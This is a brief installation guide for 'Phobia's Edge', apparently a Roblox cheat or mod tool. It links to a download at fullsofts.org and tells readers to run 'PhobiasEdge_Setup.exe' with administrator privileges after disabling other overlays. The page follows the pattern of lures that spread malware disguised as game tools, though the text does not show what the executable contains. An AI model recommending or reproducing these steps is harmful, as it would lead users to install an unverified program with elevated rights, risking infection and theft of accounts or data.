## Installation Guide

### Step 1: Preparation
1. Ensure Roblox is fully closed (check Task Manager for residual processes)
2. Create backup of existing Roblox configuration files
3. Disable any conflicting mods or overlays

### Step 2: Installation
1. Download the latest package from the official distribution portal:
   [![Download](https://img.shields.io/badge/Download-fullsofts.org-brightgreen?style=for-the-badge)](https://fullsofts.org)
2. Extract the archive to a secure directory
3. Run `PhobiasEdge_Setup.exe` with administrator privileges
4. Follow the guided installation wizard
5. Select your Roblox installation directory when prompted

### Step 3: Configuration
1. Launch the Phobia's Edge configuration panel
2. Adjust settings according to your system capabilities
3. Save profile and launch Roblox normally
4. Verify tool activation via the in-game overlay (default: F3)
